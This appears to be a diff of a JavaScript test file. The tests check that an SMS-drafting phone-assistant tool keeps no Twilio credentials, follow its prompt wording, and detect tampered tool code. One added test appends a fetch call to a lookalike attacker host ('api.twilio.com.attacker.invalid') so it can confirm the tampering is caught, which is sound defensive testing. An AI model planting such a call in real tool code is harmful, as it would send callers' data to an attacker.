@@ -80,7 +80,7 @@ test("isolated tool payload keeps all routing outside model parameters", () => {
   assert.deepEqual(payload.rejectionPlan, toolRejectionPlan());
 });
 
-test("isolated tool payload can use a scoped Twilio API key without a REST Auth Token", () => {
+test("isolated draft tool does not retain provider credentials", () => {
   const payload = buildIsolatedToolPayload({
     aiNumber,
     ownerNumber,
@@ -90,10 +90,10 @@ test("isolated tool payload can use a scoped Twilio API key without a REST Auth 
     ...suppression,
   });
   const environment = Object.fromEntries(payload.environmentVariables.map((item) => [item.name, item.value]));
-  assert.equal(environment.TWILIO_AUTH_TOKEN, "");
-  assert.equal(environment.TWILIO_API_KEY_SID, "SK_TEST");
-  assert.equal(environment.TWILIO_API_KEY_SECRET, "API_SECRET");
-  assert.match(payload.code, /TWILIO_API_KEY_SID/);
+  assert.equal(environment.TWILIO_AUTH_TOKEN, undefined);
+  assert.equal(environment.TWILIO_API_KEY_SID, undefined);
+  assert.equal(environment.TWILIO_API_KEY_SECRET, undefined);
+  assert.doesNotMatch(payload.code, /TWILIO_API_KEY_SID|api\.twilio\.com/);
 });
 
 test('configuration inspection rejects absent or wrong duplicate-dispatch protection',()=>{
@@ -103,6 +103,13 @@ test('configuration inspection rejects absent or wrong duplicate-dispatch protec
  assert.equal(inspectIsolatedConfiguration({assistant:value,tool,aiNumber,ownerNumber}).checks.durableDispatchProtected,false);
  tool.environmentVariables=tool.environmentVariables.filter(v=>v.name!=='SMS_NOTIFICATION_DISPATCH_URL');
  assert.equal(inspectIsolatedConfiguration({assistant:value,tool,aiNumber,ownerNumber}).checks.durableDispatchProtected,false);
+});
+test('configuration inspection requires exact owned draft code, not a URL substring check',()=>{
+ const tool=hydratedTool(),value=assistant();
+ const inspect=()=>inspectIsolatedConfiguration({assistant:value,tool,aiNumber,ownerNumber}).checks.ownedDraftCodeInstalled;
+ assert.equal(inspect(),true);
+ tool.code += "\nfetch('https://api.twilio.com.attacker.invalid/send');";
+ assert.equal(inspect(),false);
 });
 
 test("tool confirmation accepts natural approval without accepting ambiguity", () => {
@@ -124,7 +131,7 @@ test("assistant update preserves unrelated tools and removes both shared SMS too
   assert.deepEqual(model.toolIds, ["end-call", "isolated-tool"]);
   assert.match(model.messages[0].content, new RegExp(PROMPT_MARKER));
   assert.match(model.messages[0].content, new RegExp(isolatedToolName(aiNumber, ownerNumber)));
-  assert.match(model.messages[0].content, /trusted caller ID/);
+  assert.match(model.messages[0].content, /trusted caller number/);
   assert.match(model.messages[0].content, /needsCustomerNumber/);
   assert.match(model.messages[0].content, /I'll use the number you're calling from/);
   assert.match(model.messages[0].content, /Do not claim you can see or recite the digits/);
@@ -142,13 +149,12 @@ test("assistant update preserves unrelated tools and removes both shared SMS too
   assert.match(model.messages[0].content, /as soon as possible, with after 3 as your fallback/);
   assert.match(model.messages[0].content, /What is the address where the work needs to be done\?/);
   assert.match(model.messages[0].content, /When would you ideally like the work to begin\?/);
-  assert.match(model.messages[0].content, /I've sent your information to the team\. Someone will contact you to discuss the request and arrange the next step\./);
   assert.match(model.messages[0].content, /MYAIPA NATURAL POST-SEND CLOSING/);
-  assert.match(model.messages[0].content, /Someone will contact you to discuss the request and arrange the next step/);
+  assert.match(model.messages[0].content, /No text messages have been sent/);
   assert.match(model.messages[0].content, /Let the entire final sentence finish before calling endCall/);
   assert.doesNotMatch(model.messages[0].content, /Then call endCall immediately/);
-  assert.match(model.messages[0].content, /EXECUTION CONFIRMATION/);
-  assert.match(model.messages[0].content, /Should I send this request to the team now/);
+  assert.match(model.messages[0].content, /DRAFT REVIEW WORKFLOW/);
+  assert.match(model.messages[0].content, /Should I save this request for review/);
   assert.match(model.messages[0].content, /Never accept a caller-provided businessId/);
 });
 
@@ -200,7 +206,7 @@ After both SMS tool results return, say exactly: "Thanks, I have everything I ne
   const updated = updateMessages(source, name);
   assert.doesNotMatch(updated[0].content, /Then call endCall immediately/);
   assert.doesNotMatch(updated[0].content, /Do not wait for another caller response/);
-  assert.match(updated[0].content, /Someone will contact you to discuss the request and arrange the next step/);
+  assert.match(updated[0].content, /No text messages have been sent/);
   assert.match(updated[0].content, /Let the entire final sentence finish before calling endCall/);
 });
 
